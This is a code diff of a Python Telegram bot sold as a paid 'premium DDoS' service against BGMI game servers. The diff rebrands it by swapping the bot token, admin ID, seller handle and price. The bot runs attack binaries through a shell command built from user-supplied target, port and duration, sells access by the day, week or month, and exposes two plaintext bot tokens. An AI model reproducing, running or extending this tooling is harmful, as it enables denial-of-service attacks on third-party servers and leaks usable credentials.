@@ -6,10 +6,10 @@ import datetime
 import os
 
 # insert your Telegram bot token here
-bot = telebot.TeleBot('7071001849:AAHLjj7SsyxswkyqLJmR7Fl6o5nfJLAHjqk')
+bot = telebot.TeleBot('7023651845:AAGay4E-DPGdqyhnEblbCBGEgiXAI7W8_EY')
 
 # Admin user IDs
-admin_id = ["969452944"]
+admin_id = ["907345225"]
 
 # File to store allowed user IDs
 USER_FILE = "users.txt"
@@ -46,7 +46,7 @@ allowed_user_ids = read_users()
 
 # Function to log command to the file
 def log_command(user_id, target, port, time):
-    admin_id = ["969452944"]
+    admin_id = ["907345225"]
     user_info = bot.get_chat(user_id)
     if user_info.username:
         username = "@" + user_info.username
@@ -151,7 +151,7 @@ def add_user(message):
         else:
             response = "𝙏𝙍𝙔 𝙏𝙊 𝘼𝘿𝘿 𝙐𝙎𝙀𝙍𝙎 𝘼𝘾𝘾𝙀𝙎𝙎 𝙏𝙄𝙈𝙀\n★[ʟɪᴋᴇ --> 1 ᴅᴀʏꜱ , 2 ᴅᴀʏꜱ , 1 ᴡᴇᴇᴋ]★"
     else:
-        response = "ʏᴏᴜ ᴀʀᴇ ɴᴏᴛ ᴀᴘᴘʀᴏᴠᴇ ʙʏ ᴀᴅᴍɪɴ ᴘʟᴇᴀꜱᴇ ᴄᴏɴᴛᴀᴄᴛ --> @black_devilyt"
+        response = "ʏᴏᴜ ᴀʀᴇ ɴᴏᴛ ᴀᴘᴘʀᴏᴠᴇ ʙʏ ᴀᴅᴍɪɴ ᴘʟᴇᴀꜱᴇ ᴄᴏɴᴛᴀᴄᴛ --> @rishabgupta01"
 
     bot.reply_to(message, response)
 
@@ -224,7 +224,7 @@ def clear_users_command(message):
         except FileNotFoundError:
             response = "𝘾𝙇𝙀𝘼𝙍 𝘼𝙇𝙍𝙀𝘼𝘿𝙔"
     else:
-        response = "ʏᴏᴜ ᴀʀᴇ ɴᴏᴛ ᴀᴘᴘʀᴏᴠᴇ ʙʏ ᴀᴅᴍɪɴ ᴘʟᴇᴀꜱᴇ ᴄᴏɴᴛᴀᴄᴛ --> @black_devilyt"
+        response = "ʏᴏᴜ ᴀʀᴇ ɴᴏᴛ ᴀᴘᴘʀᴏᴠᴇ ʙʏ ᴀᴅᴍɪɴ ᴘʟᴇᴀꜱᴇ ᴄᴏɴᴛᴀᴄᴛ --> @rishabgupta01"
     bot.reply_to(message, response)
  
 
@@ -249,7 +249,7 @@ def show_all_users(message):
         except FileNotFoundError:
             response = "𝙉𝙊𝙏 𝙁𝙊𝙐𝙉𝘿"
     else:
-        response = "ʏᴏᴜ ᴀʀᴇ ɴᴏᴛ ᴀᴘᴘʀᴏᴠᴇ ʙʏ ᴀᴅᴍɪɴ ᴘʟᴇᴀꜱᴇ ᴄᴏɴᴛᴀᴄᴛ --> @black_devilyt"
+        response = "ʏᴏᴜ ᴀʀᴇ ɴᴏᴛ ᴀᴘᴘʀᴏᴠᴇ ʙʏ ᴀᴅᴍɪɴ ᴘʟᴇᴀꜱᴇ ᴄᴏɴᴛᴀᴄᴛ --> @rishabgupta01"
     bot.reply_to(message, response)
 
 @bot.message_handler(commands=['logs'])
@@ -267,7 +267,7 @@ def show_recent_logs(message):
             response = "𝙉𝙊𝙏 𝙁𝙊𝙐𝙉𝘿"
             bot.reply_to(message, response)
     else:
-        response = "ʏᴏᴜ ᴀʀᴇ ɴᴏᴛ ᴀᴘᴘʀᴏᴠᴇ ʙʏ ᴀᴅᴍɪɴ ᴘʟᴇᴀꜱᴇ ᴄᴏɴᴛᴀᴄᴛ --> @black_devilyt"
+        response = "ʏᴏᴜ ᴀʀᴇ ɴᴏᴛ ᴀᴘᴘʀᴏᴠᴇ ʙʏ ᴀᴅᴍɪɴ ᴘʟᴇᴀꜱᴇ ᴄᴏɴᴛᴀᴄᴛ --> @rishabgupta01"
         bot.reply_to(message, response)
 
 
@@ -276,7 +276,7 @@ def start_attack_reply(message, target, port, time):
     user_info = message.from_user
     username = user_info.username if user_info.username else user_info.first_name
     
-    response = f"🚩𝐇𝐄𝐘 -> {username} \n🔺𝘼𝙏𝙏𝘼𝘾𝙆🔻1--> [𝐒𝐓𝐀𝐑𝐓𝐄𝐃]\n\n†αrgε† -> {target}\np⊕r† -> {port}\n†ïmε -> {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\ngαmε --> 🇮🇳🅑🅖🅜🅘🇮🇳\n\n彡[ꜱ4 ᴏꜰꜰɪᴄɪᴀʟ ɢʀᴘ 🚩]彡"
+    response = f"🚩𝐇𝐄𝐘 -> {username} \n🔺𝘼𝙏𝙏𝘼𝘾𝙆🔻1--> [𝐒𝐓𝐀𝐑𝐓𝐄𝐃]\n\n†αrgε† -> {target}\np⊕r† -> {port}\n†ïmε -> {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\ngαmε --> 🇮🇳🅑🅖🅜🅘🇮🇳\n\n彡[amory ᴏꜰꜰɪᴄɪᴀl 🚩]彡"
     bot.reply_to(message, response)
 
 # Dictionary to store the last time each user ran the /bgmi command
@@ -312,12 +312,12 @@ def handle_bgmi(message):
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                 full_command = f"./S4 {target} {port} {time} 110", "./S41 {target} {port} {time} 10"
                 process = subprocess.run(full_command, shell=True)
-                response = f"𝘼𝙏𝙏𝘼𝘾𝙆 ♦️ 1♦️𝙀𝙉𝘿\n\n𝐓𝐀𝐑𝐆𝐄𝐓 --> {target}\n𝐏𝐎𝐑𝐓 --> {port}\n𝐓𝐈𝐌𝐄 --> {time} 𝐒𝐄𝐂.\n\n🌹𝐒𝟒 𝐎𝐅𝐅𝐈𝐂𝐈𝐀𝐋 𝐃𝐃𝐎𝐒🌹"
+                response = f"𝘼𝙏𝙏𝘼𝘾𝙆 ♦️ 1♦️𝙀𝙉𝘿\n\n𝐓𝐀𝐑𝐆𝐄𝐓 --> {target}\n𝐏𝐎𝐑𝐓 --> {port}\n𝐓𝐈𝐌𝐄 --> {time} 𝐒𝐄𝐂.\n\n🌹AMORY 𝐎𝐅𝐅𝐈𝐂𝐈𝐀𝐋 𝐃𝐃𝐎𝐒🌹"
                 bot.reply_to(message, response)  # Notify the user that the attack is finished
         else:
-            response = "⚠️1 𝙍𝙀𝘼𝘿𝙔 𝙏𝙊 𝙐𝙎𝙀⚠️\n\n/ʙɢᴍɪ1 <ᴛᴀʀɢᴇᴛ> <ᴘᴏʀᴛ> <ᴛɪᴍᴇ>\nₑₓ. ₋ ₂₅₇.₆₄.₅₅.₇ ₁₂₃₄₅ ₂₄₀\n𝙁𝙀𝙀𝘿𝘽𝘼𝘾𝙆 𝘿𝙀𝙉𝘼 👍\n\n★[ꜱ4 ᴏꜰꜰɪᴄɪᴀʟ ɢʀᴘ 🚩]★"  # Updated command syntax
+            response = "⚠️1 𝙍𝙀𝘼𝘿𝙔 𝙏𝙊 𝙐𝙎𝙀⚠️\n\n/ʙɢᴍɪ1 <ᴛᴀʀɢᴇᴛ> <ᴘᴏʀᴛ> <ᴛɪᴍᴇ>\nₑₓ. ₋ ₂₅₇.₆₄.₅₅.₇ ₁₂₃₄₅ ₂₄₀\n𝙁𝙀𝙀𝘿𝘽𝘼𝘾𝙆 𝘿𝙀𝙉𝘼 👍\n\n★[@rishabgupta01 🚩]★"  # Updated command syntax
     else:
-        response = ("ʏᴏᴜ ᴀʀᴇ ɴᴏᴛ ᴀᴘᴘʀᴏᴠᴇ ʙʏ ᴀᴅᴍɪɴ ᴘʟᴇᴀꜱᴇ ᴄᴏɴᴛᴀᴄᴛ --> @black_devilyt")
+        response = ("ʏᴏᴜ ᴀʀᴇ ɴᴏᴛ ᴀᴘᴘʀᴏᴠᴇ ʙʏ ᴀᴅᴍɪɴ ᴘʟᴇᴀꜱᴇ ᴄᴏɴᴛᴀᴄᴛ --> @rishabgupta01")
 
     bot.reply_to(message, response)
 
@@ -338,7 +338,7 @@ def show_command_logs(message):
         except FileNotFoundError:
             response = "𝙉𝙊𝙏 𝙁𝙊𝙐𝙉𝘿"
     else:
-        response = "ᴘʟᴇᴀꜱᴇ ᴄᴏɴᴛᴀᴄᴛ --> @black_devilyt"
+        response = "ᴘʟᴇᴀꜱᴇ ᴄᴏɴᴛᴀᴄᴛ --> @rishabgupta01"
 
     bot.reply_to(message, response)
 
@@ -351,8 +351,8 @@ def show_help(message):
 💥 /plan 
 💥 /myinfo
 
-𝘽𝙪𝙮 :- @black_devilyt
-𝙊𝙛𝙛𝙞𝙘𝙞𝙖𝙡 :- @black_devilyt
+𝘽𝙪𝙮 :- @rishabgupta01
+𝙊𝙛𝙛𝙞𝙘𝙞𝙖𝙡 :- @rishabgupta01
 '''
     for handler in bot.message_handlers:
         if hasattr(handler, 'commands'):
@@ -369,7 +369,7 @@ def welcome_start(message):
     user_name = message.from_user.first_name
     response = f'''❄️ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ᴘʀᴇᴍɪᴜᴍ ᴅᴅᴏ𝙨 ʙᴏᴛ, {user_name}! ᴛʜɪ𝙨 ɪ𝙨 ʜɪɢʜ ǫᴜᴀʟɪᴛʏ 𝙨ᴇʀᴠᴇʀ ʙᴀ𝙨ᴇᴅ ᴅᴅᴏ𝙨. ᴛᴏ ɢᴇᴛ ᴀᴄᴄᴇ𝙨𝙨.
 🤖Try To Run This Command : /help 
-✅BUY :- @black_devilyt'''
+✅BUY :- @rishabgupta01'''
     bot.reply_to(message, response)
 
 @bot.message_handler(commands=['rules'])
@@ -389,7 +389,7 @@ def welcome_plan(message):
 -> 𝘾𝙤𝙣𝙘𝙪𝙧𝙧𝙚𝙣𝙩𝙨 𝘼𝙩𝙩𝙖𝙘𝙠 : 2
 
 𝙋𝙧-𝙞𝙘𝙚 𝙇𝙞𝙨𝙩💸 :
-𝘿𝙖𝙮-->10 𝙍𝙨
+𝘿𝙖𝙮-->100 𝙍𝙨
 𝙒𝙚𝙚𝙠-->500 𝙍𝙨
 𝙈𝙤𝙣𝙩𝙝-->1200 𝙍𝙨
 '''
